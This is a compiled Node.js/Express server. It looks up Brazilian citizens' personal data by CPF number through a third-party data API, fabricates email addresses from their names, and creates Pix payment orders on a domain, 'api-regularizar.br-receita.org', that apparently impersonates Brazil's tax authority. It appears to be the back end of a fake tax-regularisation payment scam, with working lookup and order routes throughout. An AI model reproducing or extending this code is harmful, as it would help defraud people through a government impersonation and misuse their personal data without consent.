"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
// src/index.ts
const express_1 = __importStar(require("express"));
const dotenv_1 = __importDefault(require("dotenv"));
dotenv_1.default.config();
const app = (0, express_1.default)();
const port = process.env.PORT || 3000;
const cors_1 = __importDefault(require("cors"));
const express_rate_limit_1 = __importDefault(require("express-rate-limit"));
app.use(express_1.default.json());
app.use((0, cors_1.default)({
    origin: '*'
}));
app.set('trust proxy', 1);
const consultaRouter = (0, express_1.Router)();
const cpfLimiter = (0, express_rate_limit_1.default)({
    windowMs: 60 * 1000, // 15 minutos
    max: 10, // max 60 requests por IP
    standardHeaders: true, // retorna infos em RateLimit-* headers
    legacyHeaders: false, // desativa X-RateLimit-* headers
});
const cpfConsulta = async (req, res, next) => {
    const { cpf, cartId } = req.params;
    try {
        const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
        const upstream = await fetch(apiUrl, { method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.CPF_TOKEN}`
            }
        });
        if (!upstream.ok) {
            return res
                .status(upstream.status)
                .json({ error: `Upstream retornou ${upstream.status}` });
        }
        const data = await upstream.json();
        const getOrder = await fetch(`https://api-regularizar.br-receita.org/cart/${cartId}/customer`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                Accept: 'application/json',
            },
            body: JSON.stringify({
                name: data.NOME,
                document: data.CPF,
                document_type: 'CPF',
                email: `${data.NOME.normalize('NFD')
                    .replace(/[\u0300-\u036f]/g, '')
                    .replace(/\s+/g, '')
                    .replace(/[^a-zA-Z0-9]/g, '')
                    .toLowerCase()}@sememail.com`,
            })
        });
        if (!getOrder.ok) {
            return res
                .status(getOrder.status)
                .json({ error: `Payment API retornou ${getOrder.status}` });
        }
        return res.json(data);
    }
    catch (err) {
        next(err);
    }
};
const cpf = async (req, res, next) => {
    const { cpf, cartId } = req.params;
    try {
        const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
        const upstream = await fetch(apiUrl, { method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.CPF_TOKEN}`
            }
        });
        if (!upstream.ok) {
            return res
                .status(upstream.status)
                .json({ error: `Upstream retornou ${upstream.status}` });
        }
        const data = await upstream.json();
        return res.json(data);
    }
    catch (err) {
        next(err);
    }
};
const getCartByPlan = async (req, res, next) => {
    console.log('error');
    try {
        const paymentRes = await fetch('https://api-regularizar.br-receita.org/r/QU0tNjgwZjdmOTg3M2QwMg', {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
            }
        });
        console.log(paymentRes);
        if (!paymentRes.ok) {
            return res
                .status(paymentRes.status)
                .json({ error: `Payment API retornou ${paymentRes.status}` });
        }
        const cartId = (await paymentRes.text()).trim();
        return res.json({
            cartId
        });
    }
    catch (err) {
        return res.json(err);
    }
};
consultaRouter.get('/:cpf/:cartId', cpfLimiter, cpf);
app.use('/', consultaRouter);
const customerRouter = (0, express_1.Router)();
customerRouter.get('/:cpf/:cartId', cpfLimiter, cpfConsulta);
app.use('/customer', customerRouter);
const cartRouter = (0, express_1.Router)();
cartRouter.get('/cart', getCartByPlan);
app.use('/', cartRouter);
const paymentRouter = (0, express_1.Router)();
const payment = async (req, res, next) => {
    const { cpf, cartId } = req.params;
    try {
        const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
        const upstream = await fetch(apiUrl, { method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.CPF_TOKEN}`
            }
        });
        if (!upstream.ok) {
            return res
                .status(upstream.status)
                .json({ error: `Upstream retornou ${upstream.status}` });
        }
        const data = await upstream.json();
        const orderPayload = {
            payment_method: 'pix',
            customer: {
                name: data.NOME || 'Nome Exemplo',
                email: `${data.NOME.normalize('NFD') // separa caracteres e diacríticos
                    .replace(/[\u0300-\u036f]/g, '') // tira os acentos
                    .replace(/\s+/g, '') // tira espaços
                    .replace(/[^a-zA-Z0-9]/g, '') // tira caracteres especiais
                    .toLowerCase()}@sememail.com`,
                document: cpf,
                document_type: 'CPF'
            }
        };
        const orderRes = await fetch(`https://api-regularizar.br-receita.org/cart/${cartId}/order?`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                Accept: 'application/json',
            },
            body: JSON.stringify(orderPayload),
        });
        if (!orderRes.ok) {
            console.log(await orderRes.json());
            return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
        }
        const orderData = await orderRes.json();
        return res.json(orderData);
    }
    catch (err) {
        next(err);
    }
};
paymentRouter.get('/:cpf/:cartId', payment);
app.use("/payment", paymentRouter);
app.listen(port, () => {
    console.log(`🚀 Server rodando em http://localhost:${port}`);
});
